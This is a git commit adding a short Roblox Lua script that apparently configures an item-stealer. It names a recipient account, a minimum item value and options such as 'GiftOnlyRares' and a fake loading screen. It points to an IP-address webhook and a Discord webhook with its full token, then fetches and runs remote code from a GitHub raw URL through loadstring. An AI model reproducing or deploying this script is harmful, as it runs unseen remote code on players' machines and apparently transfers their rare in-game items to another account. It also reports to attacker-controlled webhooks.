ed2cfef41cc3904113383a0a11f8af2370fb4480
aaravcool217-maker <aarav.cool.217@gmail.com>
2025-08-04 01:31:43 -0500

    Upload Script.lua via Script Source Converter

---
+++ Script.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"Technomical_Blade"},
+    min_value = 1000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/ae23d1de5feb0551f886c4122a48d73d",
+    FakeGift = "No",
+    Trash = "https://discord.com/api/webhooks/1386799468602720327/mNTRWKEs56VMqWAXQTWnYM0-USuTDlsv-Zq4w8J7mHYUkJBhv_idMkfazmpnlxMlAHXg",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
